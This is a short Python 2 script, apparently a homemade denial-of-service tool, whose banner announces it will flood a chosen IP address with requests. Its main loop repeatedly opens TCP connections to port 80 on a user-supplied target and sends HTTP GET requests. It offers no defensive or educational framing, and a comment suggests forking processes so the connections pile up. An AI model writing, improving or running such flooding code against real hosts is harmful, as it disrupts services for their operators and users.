'''to run script:
python dos.py <target ip address> <apache> --> mac
python dos.py <target ip address> <service apache2 start>
'''

import socket, sys, os, subprocess

# hashes to be used in most print statements to sort te code in the terminal.
singlehash = '''
######################################################################
'''
doublehash = '''
######################################################################
######################################################################
'''

def Text():
    print(doublehash)    
    print('''
 ______     _      __        __    ______     ______ 
|  ____|   | |     \ \      / /   |  ____|   |  ____|
| |____    | |      \ \    / /    | |____    | |____ 
|  ____|   | |       \ \  / /     |  ____|   |  ____|
| |____    | |___     \ \/ /      | |____    | |____
|______|   |_____|     \__/       |______|   |______|


This program will D.O.S. a certain IP.
It will flood the ip with requests.
''')
    print(doublehash)

def Usage():
	print(singlehash)
	print('''Please use the script as following:\
python dos.py <target ip> <port>''')
	print(singlehash)

def Connect():
	# Use pid if you want the connections to keep piling up. 
	# So eventually you have a 1000 (range(1, 1000))  
    #pid = os.fork()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], 80))  
    print ">> GET /" + sys.argv[2] + " HTTP/1.1"  
    s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
    s.close() 

def Attack():
	
	print(singlehash)
	print "][Attacking " + sys.argv[1]  + " ... ]["  
	print "injecting " + sys.argv[2];
	print("")
	print("Press 'CTRL-SHIFT-C' to quit anytime.")
	while True:
		Connect()

Text()
Usage()
Attack()